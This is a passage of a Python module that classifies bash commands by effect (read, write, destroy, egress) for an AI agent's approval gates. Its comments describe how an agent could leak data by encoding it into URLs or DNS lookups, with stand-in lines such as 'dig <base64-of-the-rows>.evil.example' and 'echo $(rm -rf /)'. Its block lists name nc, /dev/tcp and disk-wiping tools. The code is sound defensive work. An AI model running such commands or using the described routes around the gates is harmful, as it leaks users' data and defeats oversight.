"""The tree-sitter-bash shell classifier — the bash sibling of ``classifier.py``.

Reduces a shell command to an ``ActionDescriptor`` whose ``effect`` ∈ {read,
write, destroy, egress} is the load-bearing policy axis. Rigor properties:

- **Every invocation counts**: the shell-effect model (``permissions.shell``)
  reads the command once and hands over every invocation anywhere in it (a
  ``$(...)`` substitution, a subshell, a pipeline, a nested ``sh -c``), with
  wrappers already stripped; the descriptor's effect is the MAX over all of
  them, so ``echo $(rm -rf /)`` is a ``destroy``. This module decides the
  effect of each invocation; the model decides what each invocation touches.
- **DB-CLI gate** — ``psql`` / ``snowsql`` / ``duckdb`` / … classify by the SQL they
  run: every inline ``-c/-e/-q`` fragment parses with the CLI's DIALECT, effect MAX
  over all (``select`` → read, ``drop`` → destroy floors, ``pg_read_file`` → egress).
  A bare REPL / non-SQL eval / piped session is opaque → ``write`` + ``unknown``, so
  shell can't end-run the gated ``sql.query`` tool with an unseen statement.
- **Outbound reach is ``egress``, not ``read``** — ``curl``/``wget`` and the DNS /
  reachability probes (``dig``, ``nslookup``, ``host``, ``ping``, ``traceroute``)
  send an attacker-choosable string to an attacker-choosable host, so a "plain GET"
  is a channel out of the machine. They stay ``read`` only when every address they
  name is this machine.
- **Unknown command → ``write`` + ``heuristic``** — the conservative default
  (prompts in ``default``, ``auto`` waives it, only ``bypass`` waives the floor).
- **Fail-closed:** unparseable / pipe-to-shell / a bare interpreter reading
  stdin → ``write`` + ``confidence="unknown"`` (never ``read``).
- **Warehouse floor limits** — the ``*.duckdb`` and driver+SQL floors are de-quoted
  text scans, blind to names or SQL built at runtime, env-carried paths, script-file
  bytes, and unlisted launchers. Closing those routes takes gate-side resolution.
"""

from __future__ import annotations

import os
import re
from urllib.parse import urlsplit

from alkera_cli.contracts.tool_types import (
    ActionDescriptor,
    Confidence,
    Effect,
    ResourceRef,
    StatementInfo,
)
from alkera_cli.plugins.plugin_base.permissions.classifier import descriptor_from_sql
from alkera_cli.plugins.plugin_base.permissions.policy import _FLOOR_OPERATIONS
from alkera_cli.plugins.plugin_base.permissions.shell import (
    CODE_INTERPRETERS,
    NETWORK_PROGRAMS,
    SHELLS,
    Invocation,
    NetworkReach,
    ShellEffects,
    analyze_shell,
)

_SEVERITY: dict[Effect, int] = {
    Effect.READ: 0,
    Effect.WRITE: 1,
    Effect.EGRESS: 2,
    Effect.DESTROY: 3,
    # EXEC (a DB CLI running e.g. ``COPY … FROM PROGRAM`` server-side) tops the
    # ladder, matching the SQL classifier's SEVERITY so the two never drift.
    Effect.EXEC: 4,
}

#: Character devices whose writes the kernel discards — no persistent filesystem
#: effect and no descriptor aliasing. Redirecting a read-only command's output to
#: one of these is still a read (nothing is created or truncated), so it must NOT
#: escalate READ → WRITE. The std-stream aliases (``/dev/stdout`` / ``/dev/stderr``
#: / ``/dev/fd/N`` / ``/dev/tty``) are deliberately NOT here: they point at
#: whatever the inherited descriptor is bound to — often a captured file in a
#: tool-runner — so a write through them can be a real mutation. Those fail closed
#: to write (an unrecognized path is always a write).
_NULL_SINKS: frozenset[str] = frozenset(
    {"/dev/null", "/dev/zero", "/dev/full", "/dev/random", "/dev/urandom"}
)


#: Paths bash itself turns into a socket: a redirect from or to one connects
#: to the host it names, whatever the program reading or writing it.
_NETWORK_DEVICES: tuple[str, ...] = ("/dev/tcp/", "/dev/udp/")


def _max(a: Effect, b: Effect) -> Effect:
    return a if _SEVERITY[a] >= _SEVERITY[b] else b


# ---------------------------------------------------------------------------
# Command corpus (ripped from Claude Code's read-only heuristics, owned by us)
# ---------------------------------------------------------------------------

#: Pure observers — no mutation. ``find``/``sed``/``awk``/``curl``/``git`` are
#: NOT here: they're flag-sensitive and handled by per-command logic below.
#: Some members ARE argv-sensitive too (``sort -o`` writes a file; ``ip link set`` /
#: ``ifconfig en0 down`` change host state): an output file the shell model finds
#: raises the read to a write in ``_classify_leaf``, and ``_classify_ip`` /
#: ``_classify_ifconfig`` read the verbs, so these reach this corpus only in their
#: read form. The name-resolution and reachability probes listed here (``dig`` /
#: ``nslookup``/``host``/``ping``/``traceroute``) are intercepted by
#: ``_NETWORK_REACH`` before this corpus is consulted; they classify as a read only
#: when every address they name is this machine.
_READ: frozenset[str] = frozenset(
    {
        "ls",
        "dir",
        "vdir",
        "cat",
        "bat",
        "head",
        "tail",
        "less",
        "more",
        "nl",
        "tac",
        "pwd",
        "cd",
        "echo",
        "printf",
        "which",
        "whereis",
        "whatis",
        "man",
        "type",
        "printenv",
        "ps",
        "top",
        "htop",
        "pgrep",
        "df",
        "du",
        "free",
        "uptime",
        "date",
        "cal",
        "whoami",
        "id",
        "groups",
        "hostname",
        "uname",
        "arch",
        "stat",
        "file",
        "wc",
        "sort",
        "uniq",
        "cut",
        "column",
        "fold",
        "fmt",
        "jq",
        "yq",
        "xmllint",
        "grep",
        "egrep",
        "fgrep",
        "rg",
        "ag",
        "ack",
        "locate",
        "tree",
        "realpath",
        "readlink",
        "dirname",
        "basename",
        "sleep",
        "true",
        "false",
        "test",
        "seq",
        "comm",
        "join",
        "paste",
        "diff",
        "cmp",
        "colordiff",
        "md5sum",
        "sha1sum",
        "sha256sum",
        "sha512sum",
        "cksum",
        "b2sum",
        "base32",
        "base64",
        "strings",
        "hexdump",
        "xxd",
        "od",
        "look",
        "expr",
        "bc",
        "tty",
        "lsof",
        "netstat",
        "ss",
        "ip",
        "ifconfig",
        "dig",
        "nslookup",
        "host",
        "ping",
        "traceroute",
        "env",
    }
)

#: Recoverable mutations — prompt in ``default``, waivable by ``auto``/``bypass``.
_WRITE: frozenset[str] = frozenset(
    {
        "mkdir",
        "touch",
        "cp",
        "ln",
        "mv",
        "install",
        "tee",
        "patch",
        "make",
        "cmake",
        "ninja",
        "meson",
        "bazel",
        "gradle",
        "mvn",
        "ant",
        "apply",
        "gzip",
        "gunzip",
        "bzip2",
        "xz",
        "zstd",
        "zip",
        "unzip",
        "tar",
        "chmod",
        "chgrp",
        "chown",
        "setfacl",
    }
)

#: Irreversible / wide-blast — the floor (always prompts, except under ``bypass``).
#: ``rm``/``rmdir`` of any path is treated as ``destroy`` (deletion is the
#: canonical destructive op; Claude Code always gates it).
_DESTROY: frozenset[str] = frozenset(
    {
        "rm",
        "rmdir",
        "unlink",
        "shred",
        "srm",
        "wipe",
        # `truncate` is primarily used to EMPTY/shrink a file (`truncate -s 0 log`)
        # — irreversible data loss. It can also grow a sparse file, but that's the
        # rare case; defaulting to the floor (prompts except under bypass) is the safe call.
        "truncate",
        "dd",
        "mkfs",
        "fdisk",
        "parted",
        "wipefs",
        "blkdiscard",
        "shutdown",
        "reboot",
        "poweroff",
        "halt",
        "init",
        "mkswap",
        "format",
    }
)

#: Data leaving the machine.
_EGRESS: frozenset[str] = frozenset({"scp", "sftp", "nc", "ncat", "netcat", "ftp", "tftp"})

#: Database CLIs whose literal inline SQL is parsed in the matching dialect.
#: Bare, piped, dynamic, or unparseable sessions remain ``unknown`` and prompt;
#: parseable inline reads may auto-allow under the ordinary effect policy.
_DB_CLIS: frozenset[str] = frozenset(
    {
        "psql",
        "pgcli",
        "mysql",
        "mariadb",
        "mysqlsh",
        "mycli",
        "snowsql",
        "bq",
        "bigquery",
        "duckdb",
        "sqlite3",
        "sqlite",
        "litecli",
        "clickhouse",
        "clickhouse-client",
        "mongosh",
        "mongo",
        "redis-cli",
        "cqlsh",
        "sqlplus",
        "sqlcmd",
        "mssql-cli",
        "cockroach",
        "trino",
        "presto",
        "athena",
        "spark-sql",
        "beeline",
        "hive",
        "impala-shell",
        "influx",
        "influxd",
        "usql",
        "ydb",
        "vsql",
        "isql",
        "osquery",
        "osqueryi",
        "dsbulk",
    }
)

#: Inline-SQL flags DB CLIs accept (``-c "<sql>"`` etc.). Deliberately NO ``-s``:
#: it's ``--single-step`` (psql) / ``--silent`` (mysql/clickhouse), a boolean —
#: treating it as a value-flag would swallow the NEXT arg and hide the real SQL.
_DB_SQL_FLAGS: frozenset[str] = frozenset(
    {"-c", "--command", "-e", "--execute", "-q", "--query", "--sql"}
)

#: DB CLI → SQL dialect, so the inner SQL is classified with the dialect-specific
#: dangerous-function / egress detection (``pg_read_file`` / ``xp_cmdshell`` /
#: ``load_file`` etc.). Unknown CLIs classify with the universal rules only.
_DB_CLI_DIALECT: dict[str, str] = {
    "psql": "postgres",
    "pgcli": "postgres",
    "cockroach": "postgres",
    "mysql": "mysql",
    "mariadb": "mysql",
    "mycli": "mysql",
    "mysqlsh": "mysql",
    "snowsql": "snowflake",
    "bq": "bigquery",
    "bigquery": "bigquery",
    "duckdb": "duckdb",
    "sqlite3": "sqlite",
    "sqlite": "sqlite",
    "litecli": "sqlite",
    "clickhouse": "clickhouse",
    "clickhouse-client": "clickhouse",
    "sqlcmd": "tsql",
    "mssql-cli": "tsql",
    "trino": "trino",
    "presto": "presto",
    "athena": "presto",
    "spark-sql": "spark",
    "beeline": "hive",
    "hive": "hive",
    "sqlplus": "oracle",
    "vsql": "postgres",
}


def _argv0(name: str) -> str:
    """The identity a shell gives argv[0]: the basename of a path-qualified
    command, so ``/bin/rm`` classifies as ``rm`` and no floor is dodged by
    spelling the path."""
    return name.rsplit("/", 1)[-1]


def _write(effect: Effect, operation: str, *reasons: str, heuristic: bool = False) -> StatementInfo:
    return StatementInfo(
        effect=effect,
        operation=operation,
        has_where=False,
        reasons=list(reasons),
        heuristic=heuristic,
    )


def _extend_unique_targets(targets: list[ResourceRef], additions: list[ResourceRef]) -> None:
    """Append resource references once while preserving classifier order."""
    targets.extend(target for target in additions if target not in targets)


def _db_cli_inline_sql(name: str, args: list[str]) -> list[str]:
    """ALL inline-SQL fragments a DB CLI runs — EVERY ``-c/-e/-q/--command/…``
    (space OR ``=`` form), not just the first. A decoy ``-c "select 1" -c "drop
    table t"`` must not hide the destroy behind the read."""
    out: list[str] = []
    for i, a in enumerate(args):
        if a in _DB_SQL_FLAGS and i + 1 < len(args):
            out.append(args[i + 1])
            continue
        for flag in _DB_SQL_FLAGS:
            if a.startswith(flag + "="):
                out.append(a[len(flag) + 1 :])
                break
    if not out and name in {"bq"} and "query" in args:
        # `bq query '<sql>'` — the SQL is the last quoted positional.
        for a in reversed(args):
            if a and not a.startswith("-") and a != "query":
                out.append(a)
                break
    return out


def _parse_db_fragment(sql: str, *, dialect: str) -> ActionDescriptor | None:
    """Parse one DB-CLI fragment, returning ``None`` on any opaque result."""
    try:
        return descriptor_from_sql(sql, dialect=dialect, capability="sql")
    except Exception:
        return None


def _mark_db_statement(name: str, statement: StatementInfo) -> StatementInfo:
    """Annotate an inner SQL statement with the DB-CLI route that executes it."""
    return statement.model_copy(
        update={
            "reasons": [
                f"{name} inline SQL → {statement.effect.value}",
                *statement.reasons,
            ]
        }
    )


def _classify_db_cli(name: str, args: list[str]) -> tuple[list[StatementInfo], Confidence]:
    """Classify a DB CLI into one statement per inline SQL statement.

    ``psql -c "select 1"`` is a READ (auto-allows); ``-c "drop table t"`` is a
    DESTROY (floors); ``-c "insert …"`` is a recoverable WRITE (judged in auto).
    Every inline ``-c/-e/-q`` fragment is parsed with the CLI's DIALECT (so
    ``pg_read_file`` / ``xp_cmdshell`` / ``load_file`` exfil is caught) and the
    effect is the MAX over all of them. A bare REPL / piped / unparseable session
    stays OPAQUE (``write`` + ``unknown`` → prompts in every mode except ``bypass``,
    which runs everything): we can't see what it will run, so route DB work through
    the gated ``sql.query`` tool."""
    fragments = _db_cli_inline_sql(name, args)
    dialect = _DB_CLI_DIALECT.get(name, "")
    effect = Effect.READ
    confidence: Confidence = "exact"
    parsed: list[StatementInfo] = []
    reasons: list[str] = []
    for sql in fragments:
        inner = _parse_db_fragment(sql, dialect=dialect)
        if inner is None:
            # A fragment we can't parse is opaque → fail closed to write+unknown.
            effect = _max(effect, Effect.WRITE)
            confidence = "unknown"
            reasons.append(f"{name}: unparseable inline SQL")
            continue
        if inner.confidence != "exact":
            confidence = "unknown"
        if _SEVERITY[inner.effect] > _SEVERITY[effect]:
            effect = inner.effect
        reasons.extend(inner.reasons)
        parsed.extend(inner.statements)

    if parsed and confidence == "exact":
        return ([_mark_db_statement(name, statement) for statement in parsed], "exact")

    # No parseable inline SQL (bare REPL / non-SQL eval / piped) → opaque.
    reason = f"{name}: opaque database session — route data access through the sql.query tool"
    return [_write(_max(effect, Effect.WRITE), name, reason, *reasons)], "unknown"


def _classify_invocation(inv: Invocation) -> tuple[list[StatementInfo], Confidence]:
    """Classify one invocation the model handed over, wrappers already
    stripped and nested shells already re-read. What the model could not read
    arrives as a role: a bare wrapper runs nothing, a shell whose script was
    not literal and an eval of computed text run something unseen."""
    if inv.role == "wrapper":
        return ([_write(Effect.READ, inv.program)], "exact")
    if inv.role == "eval":
        return ([_write(Effect.WRITE, "eval", "dynamic/empty eval — opaque")], "unknown")
    if inv.role == "shell":
        return (
            [
                _write(
                    Effect.WRITE,
                    inv.program,
                    f"{inv.program} runs an unknown script",
                    heuristic=True,
                )
            ],
            "unknown",
        )
    if inv.program in _DB_CLIS:
        return _classify_db_cli(inv.program, list(inv.argv))
    statement, confidence = _classify_leaf(inv)
    return ([statement], confidence)


#: git's global options that PRECEDE the subcommand; ``-c``/``-C`` etc. take a
#: value, so a naive "first non-dash arg" would mistake the value for the
#: subcommand (``git -c http.sslVerify=false push`` → "http.sslVerify=false").
_GIT_GLOBAL_VALUE_OPTS: frozenset[str] = frozenset(
    {"-C", "-c", "--git-dir", "--work-tree", "--namespace", "--exec-path", "--config-env"}
)
#: Branches a force/destructive push must never silently hit.
_GIT_PROTECTED_REFS: frozenset[str] = frozenset(
    {"main", "master", "production", "prod", "release", "develop"}
)


def _git_subcommand(args: list[str]) -> tuple[str, list[str]]:
    """The subcommand + the args after it, skipping git's global options (and
    their values) so ``git -c k=v push`` resolves ``push``, not ``k=v``."""
    i = 0
    while i < len(args):
        a = args[i]
        if not a.startswith("-"):
            return a, args[i + 1 :]
        if a in _GIT_GLOBAL_VALUE_OPTS:
            i += 2  # skip the option AND its value (e.g. `-c key=val`)
        else:
            i += 1  # a value-less global flag (--no-pager, -p, …) or `--opt=val`
    return "", []


def _is_protected_push(rest: list[str]) -> bool:
    """A push that force-overwrites or targets a protected branch — destroy/floor.
    Catches ``-f``/``--force``/``--force-with-lease[=…]``, a ``+refspec`` force
    prefix, and a ``main``/``master``/``local:main`` (colon) refspec."""
    for a in rest:
        if (
            a in ("-f", "--force")
            or a.startswith("--force-with-lease")
            or a.startswith("--force-if")
        ):
            return True
        if a.startswith("+"):  # +refspec is a force push
            return True
        # a bare protected ref, or the dest side of a `src:dst` colon refspec.
        dst = a.split(":")[-1].lstrip("+").removeprefix("refs/heads/")
        if dst in _GIT_PROTECTED_REFS:
            return True
    return False


def _classify_git(args: list[str]) -> StatementInfo:
    sub, rest = _git_subcommand(args)
    read_subs = {
        "status",
        "log",
        "diff",
        "show",
        "branch",
        "remote",
        "describe",
        "rev-parse",
        "ls-files",
        "ls-tree",
        "blame",
        "shortlog",
        "cat-file",
        "config",
        "tag",
        "fetch",
        "whatchanged",
        "reflog",
        "grep",
        "show-ref",
        "for-each-ref",
        "rev-list",
        "name-rev",
        "var",
        "help",
        "version",
    }
    if sub == "push":
        if _is_protected_push(rest):
            return _write(
                Effect.DESTROY, "git_push_force", "git push --force / to a protected branch"
            )
        return _write(Effect.WRITE, "git_push")
    if sub == "reset" and "--hard" in rest:
        return _write(Effect.DESTROY, "git_reset_hard", "git reset --hard discards working changes")
    if sub == "clean" and any(f in rest for f in ("-f", "-fd", "-fdx", "-fx", "--force")):
        return _write(Effect.DESTROY, "git_clean", "git clean -f deletes untracked files")
    if sub in ("checkout", "restore") and ("." in rest or "--" in rest or "--worktree" in rest):
        return _write(
            Effect.DESTROY, "git_restore", "git checkout/restore overwrites working files"
        )
    if sub == "branch" and any(f in rest for f in ("-D", "-d", "--delete")):
        return _write(Effect.WRITE, "git_branch_delete")
    # History/recovery destruction — these must beat the read_subs check below
    # (``reflog`` is a read SUBcommand, but ``reflog expire`` DESTROYS the recovery
    # log that would let you undo a bad reset).
    if sub == "reflog" and any(a in ("expire", "delete") for a in rest):
        return _write(
            Effect.DESTROY,
            "git_reflog_expire",
            "git reflog expire/delete destroys the recovery log",
        )
    if sub == "filter-branch":
        return _write(Effect.DESTROY, "git_filter_branch", "git filter-branch rewrites history")
    if sub == "gc" and any(a.startswith("--prune") for a in rest):
        return _write(Effect.DESTROY, "git_gc_prune", "git gc --prune destroys unreachable objects")
    if sub == "stash" and any(a in ("drop", "clear") for a in rest):
        return _write(
            Effect.DESTROY, "git_stash_drop", "git stash drop/clear discards stashed work"
        )
    if sub == "update-ref" and "-d" in rest:
        return _write(Effect.DESTROY, "git_update_ref_delete", "git update-ref -d deletes a ref")
    writes = _git_read_sub_writes(sub, rest)
    if writes is not None:
        return _write(Effect.WRITE, f"git_{sub}_write", writes)
    if sub in read_subs:
        return _write(Effect.READ, f"git_{sub}")
    return _write(Effect.WRITE, f"git_{sub or 'unknown'}", heuristic=not sub)


#: ``git config`` options that change the configuration.
_GIT_CONFIG_WRITE_OPTS: frozenset[str] = frozenset(
    {
        "--add",
        "--unset",
        "--unset-all",
        "--replace-all",
        "--rename-section",
        "--remove-section",
        "-e",
        "--edit",
    }
)
#: ``git config`` options that only read it.
_GIT_CONFIG_READ_OPTS: frozenset[str] = frozenset(
    {"--get", "--get-all", "--get-regexp", "--get-urlmatch", "--get-color", "--get-colorbool"}
)
#: ``git config`` options that take the next argument as their value.
_GIT_CONFIG_VALUE_OPTS: frozenset[str] = frozenset(
    {"-f", "--file", "--blob", "--type", "--default", "--comment", "--value"}
)
#: ``git branch`` options that create, move, copy, delete or edit.
_GIT_BRANCH_WRITE_OPTS: frozenset[str] = frozenset(
    {
        "-m",
        "-M",
        "--move",
        "-c",
        "-C",
        "--copy",
        "-u",
        "--set-upstream-to",
        "--unset-upstream",
        "--edit-description",
        "-f",
        "--force",
        "-t",
        "--track",
    }
)
#: ``git tag`` options that create, sign or delete.
_GIT_TAG_WRITE_OPTS: frozenset[str] = frozenset(
    {"-d", "--delete", "-a", "--annotate", "-s", "--sign", "-u", "-m", "-F", "-f", "--force", "-e"}
)
#: ``git branch`` / ``git tag`` options whose operands are patterns or commits
#: to list by, not a name to create.
_GIT_LIST_OPTS: frozenset[str] = frozenset(
    {
        "-l",
        "--list",
        "-a",
        "--all",
        "-r",
        "--remotes",
        "-v",
        "-vv",
        "--verbose",
        "--contains",
        "--no-contains",
        "--merged",
        "--no-merged",
        "--points-at",
        "--show-current",
        "-n",
    }
)


def _git_config_writes(rest: list[str]) -> bool:
    operands: list[str] = []
    skip = False
    for a in rest:
        if skip:
            skip = False
            continue
        if a in _GIT_CONFIG_VALUE_OPTS:
            skip = True
            continue
        if a.split("=", 1)[0] in _GIT_CONFIG_WRITE_OPTS:
            return True
        if not a.startswith("-"):
            operands.append(a)
    if operands and operands[0] in ("get", "list"):
        return False
    if operands and operands[0] in ("set", "unset", "rename-section", "remove-section", "edit"):
        return True
    if any(a.split("=", 1)[0] in _GIT_CONFIG_READ_OPTS for a in rest):
        return False
    # ``git config KEY`` reads the key; ``git config KEY VALUE`` sets it.
    return len(operands) > 1


def _git_read_sub_writes(sub: str, rest: list[str]) -> str | None:
    """Why a read-looking git subcommand writes, or ``None`` when it reads."""
    operands = [a for a in rest if not a.startswith("-")]
    flags = {a.split("=", 1)[0] for a in rest if a.startswith("-")}
    if sub in ("log", "diff", "show", "whatchanged", "shortlog") and "--output" in flags:
        return f"git {sub} --output writes a file"
    if sub == "config" and _git_config_writes(rest):
        return "git config sets a value"
    if sub == "tag" and (flags & _GIT_TAG_WRITE_OPTS or (operands and not flags & _GIT_LIST_OPTS)):
        return "git tag creates or deletes a tag"
    if sub == "branch" and (
        flags & _GIT_BRANCH_WRITE_OPTS or (operands and not flags & _GIT_LIST_OPTS)
    ):
        return "git branch creates, moves or copies a branch"
    if sub == "remote" and operands and operands[0] not in ("show", "get-url"):
        return f"git remote {operands[0]} changes the remotes"
    return None


#: Hosts that are this machine. Contacting one of them moves no data off the
#: box, so a fetch or a probe aimed only there stays a read — that keeps the
#: everyday ``curl http://localhost:8000/health`` out of the approval path.
#: The list is deliberately short: an address form that isn't obviously loopback
#: falls through to the strict side, where over-prompting is the safe mistake.
_LOCAL_HOSTS: frozenset[str] = frozenset({"localhost", "ip6-localhost", "::1", "[::1]"})

#: The authority part of a token that could name a host: a bare name/IP with an
#: optional port, or a bracketed IPv6 literal. Deliberately excludes anything with
#: whitespace or a shell metacharacter, so an ``-H 'Accept: application/json'``
#: header value is not mistaken for a destination.
_HOST_TOKEN_RE = re.compile(r"^\[?[A-Za-z0-9._:%-]+\]?$")
_URL_SCHEME_RE = re.compile(r"^[A-Za-z][A-Za-z0-9+.-]*://")


def _host_is_local(host: str) -> bool:
    """Whether ``host`` names this machine (loopback or the unspecified address)."""
    name = host.strip().strip("[]").lower()
    if not name:
        return False
    return name in _LOCAL_HOSTS or name.endswith(".localhost") or name.startswith("127.")


def _argument_host(arg: str) -> str | None:
    """The host an argument names — a URL's authority or a bare ``host[:port]`` —
    or ``None`` when the argument names no destination (an option, a header value,
    a plain word like the ``GET`` of ``-X GET``).

    A single-label word with no dot is only accepted when it is a known local name,
    so an unrecognized word yields ``None`` and the caller falls back to its
    fail-closed branch rather than reading the word as a destination."""
    if arg.startswith("-"):
        return None
    if _URL_SCHEME_RE.match(arg):
        return urlsplit(arg).hostname or None
    head = arg.split("/", 1)[0]
    if not _HOST_TOKEN_RE.match(head):
        return None
    if head.startswith("["):  # bracketed IPv6 literal, optionally with a port
        host = head[1:].split("]", 1)[0]
    elif head.count(":") == 1:
        host = head.split(":", 1)[0]
    else:
        host = head
    if not host:
        return None
    if "." not in host and not _host_is_local(host):
        return None
    return host


def _contacts_only_this_machine(reach: NetworkReach) -> bool:
    """Whether every destination the invocation names is this machine.

    ``False`` whenever that cannot be shown: an argument built at runtime
    (``curl "$URL"``) names a host we cannot see, and an invocation whose
    destinations yield no recognizable host could still be reaching anywhere.
    Only an invocation with NO destination at all (``curl --version``)
    contacts nothing."""
    if reach.dynamic:
        return False
    if not reach.destinations:
        return True
    hosts = [h for h in (_argument_host(a) for a in reach.destinations) if h]
    return bool(hosts) and all(_host_is_local(h) for h in hosts)


def _reach_of(inv: Invocation) -> NetworkReach:
    """Where a network program was pointed. The model names the destinations
    for every program in ``NETWORK_PROGRAMS``; a reach it did not record
    (a program classified here under another name) is read as unknown."""
    if inv.network is not None:
        return inv.network
    return NetworkReach(inv.program, (), True)


def _classify_network_reach(inv: Invocation, operation: str, reason: str) -> StatementInfo:
    """EGRESS unless the command demonstrably reaches nothing but this machine."""
    if _contacts_only_this_machine(_reach_of(inv)):
        return _write(Effect.READ, f"{operation}_local")
    return _write(Effect.EGRESS, operation, reason)


#: Commands whose whole job is to contact a host over the network. A lookup or a
#: fetch is NOT a read: the name being resolved and the URL being requested are
#: both attacker-choosable strings that carry whatever the model already knows off
#: the machine — ``dig <base64-of-the-rows>.evil.example`` leaks through DNS just as
#: ``curl https://evil.example/?d=…`` leaks through HTTP. Escalating them to EGRESS
#: puts them in front of the decision engine (prompt in ``default``, judged in
#: ``auto``, refused in ``read_only``/``plan``) instead of auto-allowing them with no
#: record. The literal-argument case matters as much as the dynamic one: the model
#: can simply write the stolen bytes into the argument itself.
_NETWORK_REACH: frozenset[str] = NETWORK_PROGRAMS - {"curl", "wget"}

_NETWORK_REACH_REASON = (
    "contacts a remote host, so anything already in context can be encoded into the "
    "address it asks for"
)


def _classify_curl_wget(inv: Invocation) -> StatementInfo:
    name, args = inv.program, list(inv.argv)
    egress_flags = {
        "-d",
        "--data",
        "--data-binary",
        "--data-raw",
        "--data-urlencode",
        "--data-ascii",
        "-F",
        "--form",
        "-T",
        "--upload-file",
        "--post-data",
        "--post-file",
    }
    if any(
        a in egress_flags or a.startswith(("--data", "--post-data", "--post-file", "--form"))
        for a in args
    ):
        return _write(Effect.EGRESS, f"{name}_upload", f"{name} uploads data to a remote host")
    for i, a in enumerate(args):
        if a in ("-X", "--request", "--method") and i + 1 < len(args):
            if args[i + 1].upper() in ("POST", "PUT", "PATCH", "DELETE"):
                return _write(
                    Effect.EGRESS, f"{name}_write", f"{name} {args[i + 1].upper()} sends data out"
                )
        if a.startswith("--method=") and a.split("=", 1)[1].upper() in (
            "POST",
            "PUT",
            "PATCH",
            "DELETE",
        ):
            return _write(Effect.EGRESS, f"{name}_write")
    # A plain GET is still an outbound channel: the request line carries whatever
    # the model chose to put in the path or query to a host it also chose, so the
    # rows it just read can leave in a URL. Only a fetch that provably reaches
    # nothing but this machine stays a read.
    return _classify_network_reach(
        inv,
        f"{name}_get",
        f"{name} requests a URL from a remote host, and context can be encoded into it",
    )


#: ``find`` actions that write their results to a file the command names.
_FIND_OUTPUT_ACTIONS: frozenset[str] = frozenset({"-fprint", "-fprint0", "-fprintf", "-fls"})


def _classify_find(args: list[str]) -> StatementInfo:
    if "-delete" in args:
        return _write(Effect.DESTROY, "find_delete", "find -delete removes matched files")
    for i, a in enumerate(args):
        if a in ("-exec", "-execdir", "-ok", "-okdir") and i + 1 < len(args):
            # The command run per match — escalate if it's itself destroy/egress
            # (`find … -exec rm {} +` is a bulk delete, not a plain write).
            inner = _argv0(args[i + 1])
            if inner in _DESTROY:
                return _write(Effect.DESTROY, "find_exec", f"find -exec {inner} (bulk delete)")
            if inner in _EGRESS:
                return _write(Effect.EGRESS, "find_exec", f"find -exec {inner} (egress)")
            return _write(
                Effect.WRITE, "find_exec", "find -exec runs an arbitrary command", heuristic=True
            )
    if any(a in _FIND_OUTPUT_ACTIONS for a in args):
        return _write(Effect.WRITE, "find_output", "find -fprint writes its results to a file")
    return _write(Effect.READ, "find")


#: A ``w`` / ``W`` command in a sed script, at the start of the script or after
#: an address, ``;``, ``{`` or a newline, and the ``w`` flag of a substitution,
#: after its third delimiter and any other flags. Both write the named file.
_SED_WRITE_COMMAND = re.compile(r"(?:^|[;{\n])\s*(?:\d+|\$|/(?:\\.|[^/])*/)?\s*[wW]\s*\S")
_SED_WRITE_FLAG = re.compile(
    r"s(?P<d>[^\\\n\s])(?:\\.|(?!(?P=d)).)*(?P=d)(?:\\.|(?!(?P=d)).)*(?P=d)[gpIiMme0-9]*[wW]"
)


def _sed_scripts(args: list[str]) -> list[str]:
    """The script text sed runs: every ``-e`` / ``--expression`` value, or the
    first operand when none is given."""
    scripts: list[str] = []
    for i, a in enumerate(args):
        if a in ("-e", "--expression") and i + 1 < len(args):
            scripts.append(args[i + 1])
        elif a.startswith("--expression="):
            scripts.append(a.split("=", 1)[1])
        elif a.startswith("-e") and len(a) > 2 and not a.startswith("--"):
            scripts.append(a[2:])
    if scripts:
        return scripts
    operands = [a for a in args if not a.startswith("-") or a == "-"]
    return operands[:1]


def _classify_sed(args: list[str]) -> StatementInfo:
    # in-place: `-i`, `-i.bak` (suffix), or `--in-place[=suffix]`.
    if any(a == "-i" or a.startswith(("-i", "--in-place")) for a in args):
        return _write(Effect.WRITE, "sed_inplace", "sed -i edits files in place")
    if any(a == "-f" or a.startswith(("-f", "--file")) for a in args):
        return _write(Effect.WRITE, "sed_script", "sed -f runs a script file", heuristic=True)
    if any(_SED_WRITE_COMMAND.search(s) or _SED_WRITE_FLAG.search(s) for s in _sed_scripts(args)):
        return _write(Effect.WRITE, "sed_write", "a sed w command writes a file")
    return _write(Effect.READ, "sed")


#: ``ip`` verbs that tear down / change host network state. The query forms
#: (``show``/``list``/``get``/``monitor``, or a bare ``ip addr``) stay reads.
_IP_DESTROY_VERBS: frozenset[str] = frozenset({"del", "delete", "flush"})
_IP_WRITE_VERBS: frozenset[str] = frozenset({"add", "set", "change", "chg", "replace", "append"})


def _classify_ip(args: list[str]) -> StatementInfo:
    positionals = [a for a in args if not a.startswith("-")]
    for p in positionals:
        if p in _IP_DESTROY_VERBS:
            return _write(Effect.DESTROY, f"ip_{p}", f"ip {p} tears down host network state")
    for p in positionals:
        if p in _IP_WRITE_VERBS:
            return _write(Effect.WRITE, f"ip_{p}", f"ip {p} changes host network state")
    return _write(Effect.READ, "ip")


#: ``ifconfig`` operands that TEAR DOWN host network state (``ip``'s del/flush
#: equivalents). ``down``/``up`` toggle an interface, which is the reversible
#: ``ip link set`` shape, so they land on the WRITE tier via the operand count below.
_IFCONFIG_DESTROY_VERBS: frozenset[str] = frozenset({"delete", "destroy", "-alias", "unplumb"})


def _classify_ifconfig(args: list[str]) -> StatementInfo:
    """``ifconfig`` is ``ip``'s BSD/legacy synonym and mutates through its OPERANDS:
    ``ifconfig en0 down`` / ``ifconfig en0 10.0.0.1`` / ``ifconfig en0 -alias A``.
    Only the query forms — no operand, ``-a``, or a bare ``ifconfig <iface>`` — read."""
    positionals = [a for a in args if not a.startswith("-")]
    for p in args:
        if p in _IFCONFIG_DESTROY_VERBS:
            return _write(
                Effect.DESTROY, f"ifconfig_{p.lstrip('-')}", f"ifconfig {p} tears down an interface"
            )
    if len(positionals) > 1:
        # An interface plus ANY further operand is a configuration change — there is no
        # query form that takes one, so counting operands beats an incomplete verb list.
        return _write(
            Effect.WRITE, "ifconfig_configure", "ifconfig with an operand changes network state"
        )
    return _write(Effect.READ, "ifconfig")


_SUBCOMMAND_DESTROY: dict[str, frozenset[str]] = {
    # ``rm``/``prune`` also catch TWO-level forms (``docker volume rm``) because
    # _classify_subcommand scans the leading positionals, not just the first.
    "docker": frozenset({"rm", "rmi", "prune"}),
    "podman": frozenset({"rm", "rmi", "prune"}),
    "kubectl": frozenset({"delete"}),
    "helm": frozenset({"uninstall", "delete"}),
    "terraform": frozenset({"destroy"}),
    "tofu": frozenset({"destroy"}),
    "vagrant": frozenset({"destroy"}),
    "flyctl": frozenset({"destroy"}),
